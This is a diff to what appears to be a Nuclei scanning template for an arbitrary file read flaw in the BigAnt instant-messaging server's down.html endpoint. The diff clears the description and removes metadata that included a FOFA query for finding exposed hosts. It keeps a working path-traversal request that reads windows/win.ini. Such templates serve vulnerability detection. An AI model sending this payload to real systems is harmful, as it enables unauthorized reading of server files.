@@ -3,12 +3,8 @@ info:
   name: 杭州九麒科技大蚂蚁即时通讯 down.html 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qk0wcqh8sxicf1ml'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qk0wcqh8sxicf1ml
-    fofa: (body="/Public/static/admin/admin_common.js" && body="/Public/lang/en.js") || body="BigAnt-Admin"
 http:
 - raw:
   - 'GET /Api/Update/down.html?file=../../../../../../../../windows/win.ini HTTP/1.1
